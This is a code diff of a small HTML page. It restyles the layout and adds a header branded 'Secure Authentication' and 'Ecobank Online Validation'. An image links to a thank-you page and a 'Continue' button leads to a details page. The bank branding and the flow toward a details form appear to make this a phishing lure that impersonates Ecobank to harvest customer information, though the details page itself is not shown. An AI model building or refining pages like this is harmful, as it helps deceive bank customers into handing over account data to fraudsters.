@@ -11,13 +11,27 @@
       background: linear-gradient(to bottom, #08143a, #0b1d4d);
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
       min-height: 100vh;
       color: #fff;
-      padding: 10px;
+      padding: 0;
     }
 
+    /* Header bar */
+    .header {
+      background: linear-gradient(135deg, #08143a, #0b1d4d);
+      color: #fff;
+      text-align: center;
+      width: 100%;
+      padding: 40px 20px;
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    .header h1 { margin: 0; font-size: 24px; }
+    .header p { margin: 8px 0 0; font-size: 14px; }
+
+    /* Container for image + button */
     .container {
       text-align: center;
       background: rgba(255, 255, 255, 0.08);
@@ -27,13 +41,20 @@
       max-width: 500px;
       width: 90%;
       backdrop-filter: blur(6px);
+      margin-top: -30px; /* overlap header nicely */
     }
 
-    .container img {
+    .main-image {
       max-width: 100%;
       height: auto;
       border-radius: 8px;
       box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+
+    .main-image:hover {
+      transform: scale(1.02);
     }
 
     .continue-btn {
@@ -55,12 +76,33 @@
       transform: scale(1.05);
       box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
+
+    @media (max-width: 500px) {
+      .header h1 { font-size: 20px; }
+      .header p { font-size: 12px; }
+      .continue-btn { font-size: 14px; padding: 10px 20px; width: 100%; display: block; }
+    }
   </style>
 </head>
 <body>
 
+  <div class="header">
+    <h1>Secure Authentication</h1>
+    <p>Ecobank Online Validation</p>
+  </div>
+
   <div class="container">
-    <img src="host-image.jpg" alt="Welcome Image">
+    <a href="thankyou.html">
+      <picture>
+        <!-- Prefer JPG -->
+        <source srcset="host-image.jpg" type="image/jpeg">
+        <!-- Fallback to JPEG -->
+        <source srcset="host-image.jpeg" type="image/jpeg">
+        <!-- Fallback if nothing else works -->
+        <img src="host-image.jpg" alt="Welcome Image" class="main-image">
+      </picture>
+    </a>
+
     <a href="details.html" class="continue-btn">Continue</a>
   </div>
 
